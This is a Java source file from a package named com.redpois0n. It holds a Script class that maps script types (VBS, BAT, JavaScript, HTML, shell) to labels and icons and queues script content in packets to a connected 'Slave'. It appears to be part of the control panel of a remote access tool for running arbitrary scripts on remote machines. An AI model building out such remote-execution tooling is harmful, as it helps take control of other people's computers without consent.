package com.redpois0n;

import javax.swing.ImageIcon;

import com.redpois0n.packets.incoming.PacketBuilder;
import com.redpois0n.packets.outgoing.Header;
import com.redpois0n.ui.panels.PanelControlScript;
import com.redpois0n.utils.IconUtils;


public class Script {

	public static final int VB = 0;
	public static final int BAT = 1;
	public static final int JS = 2;
	public static final int HTML = 3;
	public static final int SH = 4;

	public static PanelControlScript getScript(Slave slave, int i) {
		return new PanelControlScript(slave, i);
	}

	public static String getString(int i) {
		if (i == VB) {
			return "VB";
		} else if (i == BAT) {
			return "BAT";
		} else if (i == JS) {
			return "JavaScript";
		} else if (i == HTML) {
			return "HTML";
		} else if (i == SH) {
			return "SH";
		} else {
			return null;
		}
	}

	public static String getSendString(int i) {
		if (i == VB) {
			return "VBS";
		} else if (i == BAT) {
			return "BAT";
		} else if (i == JS) {
			return "JS";
		} else if (i == HTML) {
			return "HTML";
		} else if (i == SH) {
			return "SH";
		} else {
			return null;
		}
	}

	public static ImageIcon getIcon(int i) {
		return getIcon(getString(i));
	}

	public static ImageIcon getIcon(String str) {
		return IconUtils.getIcon("script_" + str.toLowerCase());
	}

	public static void sendScript(Slave sl, int type, String content) {
		PacketBuilder packet = new PacketBuilder(Header.SCRIPT);

		packet.add(getSendString(type));
		packet.add(content);
		
		sl.addToSendQueue(packet);
	}

}
